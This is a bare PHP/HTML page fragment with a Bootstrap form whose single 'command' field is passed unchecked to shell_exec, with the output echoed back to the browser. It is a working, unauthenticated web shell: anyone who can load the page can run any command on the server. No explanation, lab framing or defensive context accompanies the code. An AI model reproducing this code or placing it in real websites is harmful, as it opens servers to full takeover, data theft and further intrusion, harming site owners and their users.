<form method="post" class="row">
    <div class="form-group col-sm-offset-3 col-sm-6">
        <div class="input-group">
            <input class="form-control" type="text" name="command">
            <span class="input-group-btn">           
                <button type="submit" class="btn btn-block">
                    <span class="glyphicon glyphicon-play" style="width: 40px"></span>
                </button>
            </span>
        </div>
    </div>
    <div class="form-group col-sm-offset-3 col-sm-6">
        <?php
        if ($_SERVER['REQUEST_METHOD'] == 'POST' && $_POST['command']) {
            echo '<pre>';
            $output = shell_exec($_POST['command']);
            echo $output;
            echo '</pre>';
        }
        ?>
    </div>
</form>
